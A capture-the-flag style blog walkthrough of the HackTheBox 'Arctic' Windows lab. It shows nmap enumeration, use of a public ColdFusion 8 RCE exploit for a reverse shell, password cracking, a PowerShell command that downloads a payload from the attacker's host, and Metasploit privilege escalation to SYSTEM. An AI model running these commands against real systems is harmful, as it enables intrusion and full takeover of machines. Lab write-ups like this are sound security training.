---
title: "Hackthebox Artic Walkthrough"
description: "Hackthebox Artic Walkthrough"
date: 2026-01-26
categories: [Walkthrough]
tags: [hackthebox,Artic,Walkthrough,Windows]
image :
    path : https://lh3.googleusercontent.com/d/1GSolrvZcqga5v97_LZAvTDVu726ToWN7
---
<img src="https://www.hackthebox.com/badge/image/1110144" alt="User Profile Badge"><br>

Arctic is an easy Windows machine that involves straightforward exploitation with some minor challenges. The process begins by troubleshooting the web server to identify the correct exploit. Initial access can be gained either through an unauthenticated file upload in Adobe ColdFusion. Once a shell is obtained, privilege escalation is achieved using the MS10-059 exploit.

<img src="https://lh3.googleusercontent.com/d/1aAzRbzEdbm27LXnTvah1beYfM_-2yPzw" alt="">

- Let's spawn the machine .... 

<img src="https://lh3.googleusercontent.com/d/1yPHsSHtMB-GtdMva5Iw7nnY1cDQaZD2i" alt="">

## <span style="color: DarkSalmon;"><b># Enumeration</b></span> 
-----

- let's start with a nmap scan 

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Arctic]
└─$ nmap -sC -sV -p- 10.10.10.11 --min-rate=2000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 22:51 EDT
Nmap scan report for 10.10.10.11
Host is up (0.27s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 208.06 seconds
```

- multiple ports are open RPC (135, 49154) , but i found port 8500 with directory listing

<img src="https://lh3.googleusercontent.com/d/1hyZ6bhyITLvYd2GIwbYwQw5TIwvtrjaG" alt="">

- after looking around different directories , i found `ADOBE COLDFUSION 8` Application login page , installed on the endpoint 

```bash
http://10.10.10.11:8500/CFID/administrator
```

<img src="https://lh3.googleusercontent.com/d/11XngOaTMtztKJ7bTd-jbh9O0DmucowJB" alt="">

- then i search for the CVE and related poc to this software version and i found one ... 

```bash
https://github.com/0xDTC/Adobe-ColdFusion-8-RCE-CVE-2009-2265
```

## <span style="color: DarkSalmon;"><b># Initial Access</b></span> 
-------

- then i git clone the repo 

```
git clone https://github.com/0xDTC/Adobe-ColdFusion-8-RCE-CVE-2009-2265
```

- and then change to the POC directory and run the exploit , where 
    - `-l <LHOST>`    Local attacker IP (e.g., 10.10.16.5)"
    - `-p <LPORT>`   Local attacker port for listener (e.g., 9001)"
    - `-r <RHOST>`    Remote target IP (e.g., 10.10.10.11)"
    - `-q <RPORT>`    Remote target port (ColdFusion) (e.g., 8500)"

<img src="https://lh3.googleusercontent.com/d/1Vs9oVrjQeIdS4XWbOXqIWp1kOvL3xHLk" alt="">

- and got the reverse shell 

<img src="https://lh3.googleusercontent.com/d/1YCwYetgAgB-ls9fvCq-OgCcQC1cz72Oo" alt="">

- then i grab the user flag from the Desktop directory of user `tolis` 

<img src="https://lh3.googleusercontent.com/d/1yS1-mJcRGo76c8Gk331cOb5Hah9YXbZU" alt="">

- after the for privilege escalation , and looking around and found some password in the `password.properties` file 

```
dir C:\ColdFusion8\ /s /b | findstr password.properties
```

<img src="https://lh3.googleusercontent.com/d/1CiKIGN6fHx573D50fsekDGJln64mHKAG" alt="">

- then search this hash on the crackstation and luckyly got the cracked password as `happyday`

<img src="https://lh3.googleusercontent.com/d/1f4ch_bv7qju90E8lnZ5KLUMEkqa34hLP" alt="">

- Then i think of metasploit for privilege escalation for easy win , before that i generate `shell.exe` file to get the reverse shell on our meterpreter listner ... 

<img src="https://lh3.googleusercontent.com/d/1ODrjlal54g-ScS9BLYxchyTcD9y2ADAL" alt="">

- then we start the python3 server to host this file .. 

<img src="https://lh3.googleusercontent.com/d/1n2JJJ4C3eN63Sy8-KJSaH51z74KeeVra" alt="">

- now we run this setup the meterpreter listner 

```bash
msf6 auxiliary(scanner/http/coldfusion_locale_traversal) > use exploit/multi/handler
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```
- and then we run this command on the inital reverse shell we got ... 

```powershell
powershell "(new-object
System.Net.WebClient).Downloadfile('http://10.10.14.11:8000/shell.exe',
'shell.exe')"
```

<img src="https://lh3.googleusercontent.com/d/1c1PieSN9Rr_ZcqgLuem-jI--FBQr6I-f" alt="">

- and after executing this command we got the meterpreter shell 

<img src="https://lh3.googleusercontent.com/d/19Zcl1dcql9eHHcGBDELyP4vQnrp_ze-k" alt="">

## <span style="color: DarkSalmon;"><b># Privilege Escalation</b></span> 
-------

- then we  migrate our shell to a process running on x64 , for this we first list the running processes

<img src="https://lh3.googleusercontent.com/d/1yt6YAA895FM0YbXZXWiHUtoAJZTgqNkY" alt="">

- then we run this command `migrate [PID]` 

<img src="https://lh3.googleusercontent.com/d/1IBGbUs9JSZ4eX8h2BGTTmlyw1h4nrktM" alt="">

- after that we run the `locate exploit suggestor module` to look for vulnerability for privilege escalation ...

<img src="https://lh3.googleusercontent.com/d/1vWugmI0o0rBnDLsSPYuxpvi0mzPz-thR" alt="">

- then we pick one exploit module for which this much is vulnerable and set the options , and hit exploit 

<img src="https://lh3.googleusercontent.com/d/1R0HWsrIDr_iEVR4dfd3LJi6UIk8Jb-zo" alt="">

- and then we got another meterpreter session which we got as `NT AUTHORITY\SYSTEM`

<img src="https://lh3.googleusercontent.com/d/1R0HWsrIDr_iEVR4dfd3LJi6UIk8Jb-zo" alt="">

- now we get the root flag 

<img src="https://lh3.googleusercontent.com/d/1Su_IdT58dy4CgC-3om1BZEBERD5BkM5a" alt="">


<br>
## <span style="color: DarkSalmon;"><b># Final Thoughts</b></span>
--------
I hope this blog continues to be helpful in your learning journey!. If you find this blog helpful, I’d love to hear your thoughts ; my inbox is always open for feedback. Please excuse any typos, and feel free to point them out so I can correct them. Thanks for understanding and happy learning!. You can contact me on Linkedin and Twitter <br>
[linkdin](https://www.linkedin.com/in/hitesh-sharma-413862245/) <br>
[Twitter](https://x.com/Archtrmntor)<br>
<img src="https://tryhackme-badges.s3.amazonaws.com/Archtrmntor.png" alt="Your Image Badge" /><br>